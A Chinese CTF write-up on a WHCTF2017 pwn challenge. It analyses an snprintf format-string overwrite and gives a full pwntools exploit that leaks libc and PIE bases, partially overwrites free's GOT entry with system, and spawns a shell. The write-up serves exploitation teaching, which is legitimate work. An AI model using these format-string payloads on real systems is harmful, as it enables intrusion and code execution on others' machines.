    PWN题 格式化字串 partial_write
    Created At : 2020-07-17 21:19
    Count:1.9k Views 👀 :
    Comment:

    2. 分析程序：
    3. 漏洞利用：
    4. EXP：
    5. 总结：

    保护机制：

    Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

    分析程序：

    当code输入’1’后，执行sub_B30，程序如下：

    unsigned __int64 sub_B30()
{
  char s; // [rsp+10h] [rbp-BF0h]
  char v2; // [rsp+410h] [rbp-7F0h]
  __int64 v3; // [rsp+7F8h] [rbp-408h]
  unsigned __int64 v4; // [rsp+BF8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(&s, 0, 0x400uLL);
  memset(&v3, 0, 8uLL);
  memset(&v2, 0, 0x7E8uLL);
  LOWORD(v3) = 29477;
  BYTE2(v3) = 0;
  puts("Welcome To WHCTF2017:");
  read(0, &s, 0x438uLL);
  snprintf(&v2, 0x7D0uLL, (const char *)&v3, &s);
  printf("Your Input Is :%s\n", &v2);
  return __readfsqword(0x28u) ^ v4;
}

    read语句输入s栈，但不存在溢出，而看到v2栈的大小是 0x7F0-0x408=0x3e8
    而我们可以输入的大小是 0x7D0，存在溢出漏洞。也就是说v2可以溢出到v3。
    v3存储着格式化字符，所以可以覆盖修改格式化字符串，做到任意地址读写。

    经过不断的调试，发现snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。由于地址是没变的，变的是地址里面的内容。所以我们覆盖v3的格式化字符是可行的，只要这个位置是什么格式化字符，程序就会照应执行。

    当code输入’2’时，将会分配一个堆，然后读取我们的输入，然后free掉buf。

    漏洞利用：

    思路：
    利用snprintf处的格式化字符串漏洞，修改free的GOT表，让它指向system，然后我们第二次输入/bin/sh字符串，那么/bin/sh将会存到堆里，当调用free(buf)，时，就相当于执行了system(binsh_addr)，我们就能getshell。

    在IDA远程动态调试的时候，发现栈里有一个__libc_start_main+F0 的地址，我们可以利用snprintf把它的值暴露出来。
    这样我们再减去0xF0 就相当于知道libc基址了。
    所以payload：

    sh.sendlineafter('Input Your Code:\n','1')  
#泄露__libc_start_main+F0的地址  
payload = 'a'*(0x3E8)+'bb%397$p'  
sh.sendafter('Welcome To WHCTF2017:\n',payload)  
sh.recvuntil('0x')  
__libc_start_main = int(sh.recvuntil('\n'),16) - 0xF0

    这其中的字符’bb’(不能是aa,反正不能与前面的那0x3E8个字符一样，不知道为什么) 是为了覆盖原先的’%s’，根据上面说的snprintf工作过程，snprintf处理前面0x3E8个字符时，用的都是%s来格式化，当处理第一个b时,此时b已经覆盖了%号，格式化字符串变为bs，当处理第二个b时，此时b覆盖了字符s，格式化字符串变成bb。接下来,%397$p被原模原样的覆盖到了bb的后面，也就是最后，格式化字符串变成了bb%397$p，当snprintf读到格式化字符串为bb%397$p，变打印了bb0x[第397个元素的值]

    %397$p就是距栈底397个位置的数据(也就是libc_start_main+F0)
    在我们跟踪进入snprintf函数以后，并且还未对rsp做调整时，栈顶rsp为0x7FFD176702D0，然后我们找到    libc_start_main+F0在栈里的位置,为0x7FFD17670F38
    所以，(0x7FFD17670F38 –0x7FFD176702D0) / 8 = 397
    偏移就是397啦。
    发现在__libc_start_main+F0前面的就是init，
    所以我们利用同样的方法泄露init的地址，init的偏移就是 396 啦。
    泄露出init的地址后，由于0xDA0为init在二进制文件中的静态地址，所以我们减去 0xDA0后就是 elf基址了。

    然后，我们该如何来修改free的GOT表呢？
    首先我们不能把p64(addr)放格式化字符串的前面，因为p64(addr)里面有0，会导致snprintf遇到0后就结束，不能读取到我们后来的格式化字符串。
    所以payload写成这样：
    payload = ‘a’*(0x3E8) + (‘bb%’ + str(data - 0x3FE) + ‘c%133$hn’).ljust(16,’a’) + p64(free_addr + 2)
    其中，%133$hn代表把距栈顶133个位置处的数据当成地址，往那个地址处写一个值，hn表示写一个WORD（字）的数据，也就是2字节数据，这个值就是在这之前snprintf已经打印了多少个字符，把字符个数填进去。
    ljust(16,’a’)是为了凑出16字节，格式化字符串可能超过8字节，但不会超过16字节，并且，由于要8字节对齐，所以需要补足。
    那这个133是如何得到的？
    当进入snprintf，当还没变更rsp时，rsp栈顶为0x7FFF4D0A1BE0，然后我们看到我们输入的数据是从0x 7FFF4D0A1C10开始的
    于是偏移为
    (0x 7FFF4D0A1C10 - 0x7FFF4D0A1BE0) / 8 + (0x3E8 + 16) / 8 = 133
    即 6+127=133

    EXP：

    #coding:utf-8
from pwn import *
# from LibcSearcher import *
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=process('./pwn1')
elf=ELF('./pwn1')

#这一步是为了加载free对应的got表，调用一次后便有了free的got地址了
p.sendlineafter('Input Your Code:\n','2')
p.sendlineafter('Input Your Name:\n','sixpar')

#泄露__libc_start_main+F0的地址  
p.sendlineafter('Input Your Code:\n','1')
payload='a'*0x3E8+'bb%397$p'
# 0x3E8 = 0x7F0(v3位置) – 0x408(v2位置)
#也就是从v2位置输入0x3EB个字节后可以覆盖v3数据
p.sendlineafter('Welcome To WHCTF2017:\n',payload)
p.recvuntil('0x')
libc_start_main_addr=int(p.recvuntil('\n').strip(),16)-0xF0
print "libc_start_main_addr is:"+hex(libc_start_main_addr)

# libc基址
# libc=LibcSearcher('__libc_start_main',libc_start_main_addr)
# libc_base=libc_start_main_addr-libc.dump('__libc_start_main')
# system_addr=libc_base+libc.dump('system')
libc_base=libc_start_main_addr-libc.symbols['__libc_start_main']
system_addr=libc_base+libc.symbols['system']
print "libc_base is:"+hex(libc_base)
print "system_addr is:"+hex(system_addr)

#泄漏init地址：
p.sendlineafter('Input Your Code:\n','1')
payload='a'*0x3E8+'bb%396$p'
p.sendlineafter('Welcome To WHCTF2017:\n',payload)
p.recvuntil('0x')
init_addr=int(p.recvuntil('\n').strip(),16)
print "init_addr is:"+hex(init_addr)

#由于0xDA0为init在二进制文件中的静态地址，所以
elf_base=init_addr-0xDA0
print "elf_base is:"+hex(elf_base)

#由于PIE所以导致elf基址不知，现在可以得到free_got的实际地址了
free_addr=elf_base+elf.got['free'] 
print "free_addr is:"+hex(free_addr)

# pause()
#修改free地址的低位字节，使其指向system
#假如在某次运行中，得到以下地址：
# libc_start_main_addr is:0x7ff691e97740
# libc_base is:0x7ff691e77000
# system_addr is:0x7ff691ebc390
# init_addr is:0x55bca1690da0
# elf_base is:0x55bca1690000
# free_addr is:0x55bca1892018
#我们可以pause断下exp调试，然后gdb attach pid 的方法查看数据
#比如查看此时free地址的内容：
# gdb-peda$ x/20xg 0x55bca1892018
# 0x55bca1892018:    0x00007ff691efb4f0    0x00007ff691ee6690
#可以看到此时free指向的是0x00007ff691efb4f0，我们得把这个地址改为system的才行
#比对一下：
#0x00007ff691efb4f0
#0x00007ff691ebc390  <== system地址
#发现只需要修改后仨字节即可， 这种手法叫做partial write


# 修改倒数第3.4字节
p.sendlineafter('Input Your Code:\n','1')
_3_4_data=(system_addr &0xFFFFFFFF)>>16
payload1='a'*0x3E8+('bb%'+str(_3_4_data-0x3fe)+'c%133$hn').ljust(16,'a')+p64(free_addr+2)
#解释一下这里为什么是0x3fe
#个人认为就是还要算上程序打印出来的字符，即‘Welcome To WHCTF2017:\n’，
# len('Welcome To WHCTF2017:\n') 刚好就等于22字节
# 0x3e8+22=0x3fe ，解释的通
p.sendlineafter('Welcome To WHCTF2017:\n',payload1)

#修改倒数第1,2字节
p.sendlineafter('Input Your Code:\n','1')
_1_2_data=system_addr &0xFFFF
payload2='a'*0x3E8+('bb%'+str(_1_2_data-0x3fe)+'c%133$hn').ljust(16,'a')+p64(free_addr)
p.sendlineafter('Welcome To WHCTF2017:\n',payload2)

#getshell
p.sendlineafter('Input Your Code:\n','2')
p.sendlineafter('Input Your Name:\n','/bin/sh')
p.interactive()
